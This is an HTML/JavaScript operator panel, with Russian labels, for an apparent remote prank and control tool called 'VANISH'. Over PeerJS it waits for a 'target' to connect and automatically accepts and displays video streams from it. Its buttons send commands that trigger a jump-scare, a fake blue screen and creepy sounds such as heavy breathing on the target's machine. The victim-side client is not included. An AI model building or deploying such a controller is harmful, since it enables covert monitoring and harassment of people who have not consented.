<!DOCTYPE html>
<html>
<head>
    <title>TERMINAL v8.0 - VANISH</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        #sidebar { width: 320px; border-right: 1px solid #222; padding: 20px; background: #0a0a0a; display: flex; flex-direction: column; }
        #monitor { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; padding: 20px; background: #000; overflow-y: auto; }
        video { width: 100%; border: 2px solid #333; border-radius: 8px; background: #111; box-shadow: 0 0 15px rgba(0,255,0,0.1); }
        .btn { padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-bottom: 12px; border-radius: 6px; border: 1px solid #0f0; background: transparent; color: #0f0; text-transform: uppercase; transition: 0.2s; }
        .btn:hover { background: #0f0; color: #000; box-shadow: 0 0 20px #0f0; }
        .btn-red { border-color: #ff0050; color: #ff0050; }
        .btn-red:hover { background: #ff0050; color: #fff; box-shadow: 0 0 20px #ff0050; }
        .status { padding: 10px; border: 1px solid #333; margin-bottom: 20px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <audio id="notif" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>

    <div id="sidebar">
        <h2 style="color: #ff0050;">VANISH CORE</h2>
        <div id="st" class="status">ОЖИДАНИЕ ПОДКЛЮЧЕНИЯ...</div>
        
        <button class="btn btn-red" onclick="send('SCR')">💀 ЗАПУСТИТЬ СКРИМЕР 💀</button>
        <button class="btn" onclick="send('BSOD')">💻 СИНИЙ ЭКРАН (BSOD)</button>
        <hr color="#222" style="width: 100%;">
        <p>УДАЛЕННЫЕ ЗВУКИ:</p>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/fart-with-reverb.mp3')">💨 ПУК</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК В ДВЕРЬ</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
    </div>

    <div id="monitor"></div>

    <script>
        const MY_ID = '09062012';
        const peer = new Peer(MY_ID);
        let activeConn = null;

        peer.on('connection', conn => {
            activeConn = conn;
            document.getElementById('notif').play().catch(()=>{});
            document.getElementById('st').innerText = "ЦЕЛЬ ПОДКЛЮЧЕНА (ONLINE)";
            document.getElementById('st').style.borderColor = "#0f0";
            document.getElementById('st').style.color = "#0f0";
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const v = document.createElement('video');
                v.autoplay = true; v.playsinline = true; v.srcObject = stream;
                document.getElementById('monitor').appendChild(v);
            });
        });

        function send(t) { if(activeConn) activeConn.send({ type: t }); }
        function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }

        window.onclick = () => { console.log("Interface Active"); };
    </script>
</body>
</html>
